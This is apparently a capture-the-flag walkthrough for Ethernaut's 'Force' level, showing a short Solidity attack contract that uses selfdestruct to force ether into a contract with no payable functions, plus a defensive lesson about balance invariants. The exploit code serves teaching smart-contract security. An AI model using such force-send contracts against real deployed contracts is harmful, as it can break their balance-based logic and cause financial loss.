---
description: >-
  forcefully sending ether to a contract that doesn't have payable function,
  payable fallback() function, or receive() function.
---

# 7 - Force

Ethernaut Level7: [Force](https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### Goal of this level

* make the balance of the contract greater than zero

### What you should know before

* `selfdestruct`\
  ``-> see [here](https://www.alchemy.com/overviews/selfdestruct-solidity) and [here](https://www.youtube.com/watch?v=cODYglsn3bs)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

If you use `selfdestruct` you can forcefully send ether to any contract even if that contract doesn't have any method to receive either.

</details>

There are 3 ways that a contract can receive ether.

1. payable `function`
2. payable `fallback()`
3. `receive()`

But **`Force`** contract has none of them.

But we can forcefully send ether by using `selfdestruct`.

```solidity
contract AttackForce {
    address force;

    constructor(address _instanceAddr) payable {
        force = _instanceAddr;
    }

    function attack() external {
        selfdestruct(payable(force));
    }
}
```

Deploy `AttackForce` contract with some eth, and call `attack()` function.

Done! 😎

## Key Takeaway

* You can forcefully send ether using `selfdestruct`.
* So do not count on the invariant `address(this).balance == 0` for any contract logic.\
